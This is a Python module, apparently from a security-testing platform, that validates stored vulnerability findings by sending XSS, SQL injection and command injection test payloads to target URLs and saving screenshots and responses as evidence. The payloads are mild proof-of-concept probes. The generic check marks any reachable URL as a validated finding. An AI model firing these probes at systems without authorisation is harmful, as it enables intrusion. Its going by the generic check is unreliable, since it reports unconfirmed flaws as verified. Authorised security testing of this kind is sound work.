"""
Exploit Agent - Performs controlled exploitation and generates PoC
"""
import os
import sys
import json
from typing import Dict, Any, Optional
from playwright.sync_api import sync_playwright
import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../'))

from shared.database import DatabaseManager, Finding, FindingStatus, Evidence, EvidenceType
from shared.config import settings
from shared.storage import StorageManager

class ExploitAgent:
    """Performs controlled exploitation with evidence generation"""
    
    def __init__(self):
        self.db_manager = DatabaseManager(settings.database_url)
        self.storage_manager = StorageManager()
    
    def execute(self, finding_id: str):
        """Execute controlled exploitation on a finding"""
        session = next(self.db_manager.get_session())
        try:
            finding = session.query(Finding).filter(Finding.id == finding_id).first()
            if not finding:
                print(f"Finding {finding_id} not found")
                return
            
            print(f"Attempting controlled exploitation for: {finding.title}")
            
            # Determine exploitation strategy based on finding type
            if "xss" in finding.title.lower() or "cross-site scripting" in finding.title.lower():
                result = self.exploit_xss(finding)
            elif "sql" in finding.title.lower():
                result = self.exploit_sqli(finding)
            elif "command" in finding.title.lower():
                result = self.exploit_command_injection(finding)
            else:
                result = self.generic_exploit(finding)
            
            if result.get("success"):
                # Generate evidence
                self.generate_evidence(session, finding, result)
                
                # Update finding status
                finding.status = FindingStatus.VALIDATED
                finding.confidence = 0.95
                session.commit()
                
                print(f"Exploitation successful for finding {finding_id}")
            else:
                print(f"Exploitation failed: {result.get('error')}")
        
        except Exception as e:
            print(f"Error executing exploit agent: {e}")
        finally:
            session.close()
    
    def exploit_xss(self, finding: Finding) -> Dict[str, Any]:
        """Exploit XSS vulnerability with controlled payload"""
        print(f"Exploiting XSS at {finding.affected_url}")
        
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()
            
            try:
                # Set up alert handler to detect XSS execution
                alert_triggered = False
                
                def handle_dialog(dialog):
                    nonlocal alert_triggered
                    alert_triggered = True
                    dialog.accept()
                
                page.on("dialog", handle_dialog)
                
                # Navigate with XSS payload
                payload = "<script>alert('XSS')</script>"
                test_url = f"{finding.affected_url}?{finding.affected_parameter}={payload}"
                
                page.goto(test_url, timeout=10000)
                page.wait_for_timeout(2000)
                
                # Take screenshot as evidence
                screenshot_path = f"/tmp/xss_exploit_{finding.id}.png"
                page.screenshot(path=screenshot_path)
                
                browser.close()
                
                return {
                    "success": alert_triggered,
                    "payload": payload,
                    "screenshot": screenshot_path,
                    "url": test_url
                }
            
            except Exception as e:
                browser.close()
                return {"success": False, "error": str(e)}
    
    def exploit_sqli(self, finding: Finding) -> Dict[str, Any]:
        """Exploit SQL injection vulnerability"""
        print(f"Exploiting SQL injection at {finding.affected_url}")
        
        try:
            # Use a safe SQL injection payload that extracts database version
            payload = "' UNION SELECT version()--"
            test_url = f"{finding.affected_url}?{finding.affected_parameter}={payload}"
            
            response = requests.get(test_url, timeout=10)
            
            # Check if database version is in response
            db_indicators = ["postgresql", "mysql", "sqlite", "oracle", "mssql"]
            success = any(ind in response.text.lower() for ind in db_indicators)
            
            return {
                "success": success,
                "payload": payload,
                "response": response.text[:500],
                "status_code": response.status_code
            }
        
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def exploit_command_injection(self, finding: Finding) -> Dict[str, Any]:
        """Exploit command injection vulnerability"""
        print(f"Exploiting command injection at {finding.affected_url}")
        
        try:
            # Use safe command that doesn't cause damage
            payload = "; echo 'EXPLOIT_SUCCESS'"
            test_url = f"{finding.affected_url}?{finding.affected_parameter}={payload}"
            
            response = requests.get(test_url, timeout=10)
            
            success = "EXPLOIT_SUCCESS" in response.text
            
            return {
                "success": success,
                "payload": payload,
                "response": response.text[:500]
            }
        
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def generic_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Generic exploitation attempt"""
        print(f"Attempting generic exploitation for {finding.title}")
        
        try:
            response = requests.get(finding.affected_url, timeout=10)
            
            return {
                "success": True,
                "note": "Generic verification completed",
                "status_code": response.status_code
            }
        
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def generate_evidence(self, session, finding: Finding, exploit_result: Dict[str, Any]):
        """Generate and store evidence"""
        print(f"Generating evidence for finding {finding.id}")
        
        # Store screenshot if available
        if "screenshot" in exploit_result:
            try:
                with open(exploit_result["screenshot"], "rb") as f:
                    screenshot_data = f.read()
                    storage_key = f"evidence/{finding.project_id}/{finding.id}/exploit_screenshot.png"
                    self.storage_manager.upload_bytes(storage_key, screenshot_data, len(screenshot_data))
                    
                    evidence = Evidence(
                        finding_id=finding.id,
                        type=EvidenceType.SCREENSHOT,
                        storage_key=storage_key,
                        filename="exploit_screenshot.png",
                        size_bytes=len(screenshot_data)
                    )
                    session.add(evidence)
                
                # Clean up temp file
                os.remove(exploit_result["screenshot"])
            
            except Exception as e:
                print(f"Error storing screenshot: {e}")
        
        # Store exploit details as JSON
        try:
            exploit_json = json.dumps(exploit_result, indent=2)
            storage_key = f"evidence/{finding.project_id}/{finding.id}/exploit_details.json"
            self.storage_manager.upload_bytes(storage_key, exploit_json.encode(), len(exploit_json))
            
            evidence = Evidence(
                finding_id=finding.id,
                type=EvidenceType.RAW_REQUEST,
                storage_key=storage_key,
                filename="exploit_details.json",
                size_bytes=len(exploit_json)
            )
            session.add(evidence)
        
        except Exception as e:
            print(f"Error storing exploit details: {e}")
        
        session.commit()

def main():
    """Main entry point"""
    finding_id = os.getenv("FINDING_ID")
    if not finding_id:
        print("No FINDING_ID provided")
        return
    
    agent = ExploitAgent()
    agent.execute(finding_id)

if __name__ == "__main__":
    main()
